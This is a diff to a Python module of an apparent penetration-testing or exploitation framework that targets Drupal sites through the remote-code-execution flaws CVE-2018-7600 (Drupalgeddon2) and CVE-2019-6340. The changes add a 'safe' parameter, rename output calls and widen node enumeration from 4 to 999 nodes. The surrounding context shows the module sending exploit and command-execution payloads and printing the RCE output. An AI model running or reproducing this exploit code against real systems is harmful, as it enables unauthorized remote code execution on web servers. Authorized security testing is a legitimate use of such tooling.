@@ -18,7 +18,7 @@ class Module:
     name = 'Drupal'
     description = 'Discover and exploit drupal (CVE-2018-7600, CVE-2019-6340)'
 
-    def run(self, target, args, useragent, proxy, timeout):
+    def run(self, target, args, useragent, proxy, timeout, safe):
         http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)
 
         res = http.get(target['path'])
@@ -58,7 +58,7 @@ class Module:
 
                 res = http.post(exploit_url, printf_payload)
                 if res != None and res["code"] in [200] and random_str in res["html"]:
-                    Output.write({'target': http.url(target['path']), 'message': 'Drupal vulnerable to Drupalgeddon2 RCE (CVE-2018-7600)'})
+                    Output.vuln({'target': http.url(target['path']), 'message': 'Drupal vulnerable to Drupalgeddon2 RCE (CVE-2018-7600)'})
 
                     vuln_info = {
                         'hostname': target['hostname'],
@@ -75,14 +75,14 @@ class Module:
                         res = http.post(exploit_url, exec_payload)
                         try:
                             res = json.loads(res['html'])
-                            Output.write({'target': http.url(target['path']), 'message': 'RCE exploitation output:\n%s' % res[0]['data']})
+                            Output.highlight({'target': http.url(target['path']), 'message': 'RCE exploitation output:\n%s' % res[0]['data']})
                         except:
-                            Output.write({'target': http.url(target['path']), 'message': 'Execution error'})
+                            Output.highlight({'target': http.url(target['path']), 'message': 'Execution error'})
 
                 # Check CVE-2019-6340
 
                 # A usable node must be found first
-                for i in range(1, 5):
+                for i in range(1, 1000):
                     node_url = os.path.join(target['path'], 'node/%d' % i)
                     output = http.get(node_url)
 
@@ -130,7 +130,7 @@ class Module:
                         continue
 
                     if res != None and res["code"] in [200] and random_str in res["html"]:
-                        Output.write({'target': http.url(target['path']), 'message': 'Drupal vulnerable to RCE (CVE-2019-6340)'})
+                        Output.vuln({'target': http.url(target['path']), 'message': 'Drupal vulnerable to RCE (CVE-2019-6340)'})
 
                         vuln_info = {
                             'hostname': target['hostname'],
@@ -143,7 +143,7 @@ class Module:
                         DB.insert_vulnerability(vuln_info)
 
                         if args['exec']:
-                            Output.write({'target': http.url(target['path']), 'message': 'RCE exploitation output:\n%s' % res['html'].split(random_str)[-1]})
+                            Output.highlight({'target': http.url(target['path']), 'message': 'RCE exploitation output:\n%s' % res['html'].split(random_str)[-1]})
 
                     break
 
@@ -169,7 +169,7 @@ class Module:
 
                 res = http.post(res_url, res_payload)
                 if res != None and res["code"] in [200] and random_str in res["html"]:
-                    Output.write({'target': http.url(target['path']), 'message': 'Drupal vulnerable to Drupalgeddon2 RCE (CVE-2018-7600)'})
+                    Output.vuln({'target': http.url(target['path']), 'message': 'Drupal vulnerable to Drupalgeddon2 RCE (CVE-2018-7600)'})
 
                     vuln_info = {
                         'hostname': target['hostname'],
@@ -201,4 +201,4 @@ class Module:
 
                         res = res["html"]
                         res = "[".join(res.split('[')[:-1])
-                        Output.write({'target': http.url(target['path']), 'message': 'RCE exploitation output:\n%s' % res})
+                        Output.highlight({'target': http.url(target['path']), 'message': 'RCE exploitation output:\n%s' % res})
